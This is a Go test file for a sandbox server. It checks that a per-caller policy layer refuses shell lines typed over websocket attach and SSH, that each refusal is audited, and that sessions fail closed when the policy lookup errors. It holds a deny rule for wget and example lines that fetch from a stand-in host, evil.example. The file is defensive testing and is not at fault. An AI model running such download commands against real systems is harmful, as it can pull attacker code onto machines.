package server

import (
	"bytes"
	"context"
	"errors"
	"net/http"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/zybuu-ai/abhed/controlplane"
	"github.com/zybuu-ai/abhed/driver"
	"github.com/zybuu-ai/abhed/wsconn"
)

// The caller's policy layer judges the lines typed into :attach and an SSH
// shell, asked for per caller; one that cannot be had refuses the call.
func TestSandboxShellsTakeTheCallersPolicyLayer(t *testing.T) {
	var mu sync.Mutex
	var asked []SessionPolicyRequest
	broken := false
	r := newWSRig(t, nil, []driver.Capability{driver.CapAttach}, func(o *Options) {
		o.SandboxSSHKey = testHostKey(t)
		o.SessionPolicy = func(_ context.Context, req SessionPolicyRequest) (*PolicyLayer, error) {
			mu.Lock()
			defer mu.Unlock()
			asked = append(asked, req)
			if broken {
				return nil, errors.New("the workspace store is down")
			}
			return &PolicyLayer{Name: "workspace pay", Deny: []string{"bash(wget *)"}}, nil
		}
	})
	shellFake(r.cpRig)
	sb := r.ready(t, "alice")

	ws, err := r.dial(t, "alice", "/v1/sandboxes/"+sb.ID+":attach", protoAttach)
	if err != nil {
		t.Fatal(err)
	}
	control(t, ws)
	readUntil(t, ws, "$ ")
	_ = ws.WriteMessage(wsconn.Binary, []byte("wget https://evil.example/x\r"))
	if got := readUntil(t, ws, "Denied"); strings.Contains(got, "wget https") {
		t.Fatalf("the refused line reached the shell: %q", got)
	}
	ref := waitAudit(t, r.cpRig, sb.ID, "attach.refused", controlplane.OutcomeFailed)
	if ref.Detail["terminal"] == "" {
		t.Fatalf("refusal record %+v", ref)
	}
	_ = ws.Close()

	client := sshClient(t, r, sb.ID)
	s, _ := client.NewSession()
	var out lockedBuffer
	s.Stdout = &out
	in, _ := s.StdinPipe()
	if err := s.Shell(); err != nil {
		t.Fatal(err)
	}
	_, _ = in.Write([]byte("wget https://evil.example/y\r"))
	for i := 0; i < 500 && !strings.Contains(out.String(), "Denied"); i++ {
		time.Sleep(10 * time.Millisecond)
	}
	if !strings.Contains(out.String(), "Denied") || strings.Contains(out.String(), "wget https") {
		t.Fatalf("ssh shell: %q", out.String())
	}
	_ = s.Close()
	mu.Lock()
	if len(asked) < 2 || asked[0].User != "alice" || asked[0].Tenant != "default" {
		t.Fatalf("asked %+v", asked)
	}
	broken = true
	mu.Unlock()

	// Fails closed: no layer, no shell, no command.
	_, err = r.dial(t, "alice", "/v1/sandboxes/"+sb.ID+":attach", protoAttach)
	if handshakeStatus(t, err) != http.StatusServiceUnavailable {
		t.Fatalf("attach without its layer: %v", err)
	}
	rec := r.do(t, cpCall{method: "POST", path: "/v1/sandboxes/" + sb.ID + ":exec", token: "alice", body: `{"command":"true"}`})
	if rec.Code != http.StatusServiceUnavailable {
		t.Fatalf("exec without its layer: %d %s", rec.Code, rec.Body.String())
	}
	if _, err := r.dial(t, "alice", "/v1/sandboxes/"+sb.ID+":ssh", protoSSH); handshakeStatus(t, err) != http.StatusServiceUnavailable {
		t.Fatalf("ssh without its layer: %v", err)
	}
	if r.fake.Calls("exec") != 0 {
		t.Fatal("a command ran")
	}
}

// lockedBuffer is written by one goroutine while the test reads it.
type lockedBuffer struct {
	mu sync.Mutex
	b  bytes.Buffer
}

func (l *lockedBuffer) Write(p []byte) (int, error) {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.b.Write(p)
}

func (l *lockedBuffer) String() string {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.b.String()
}
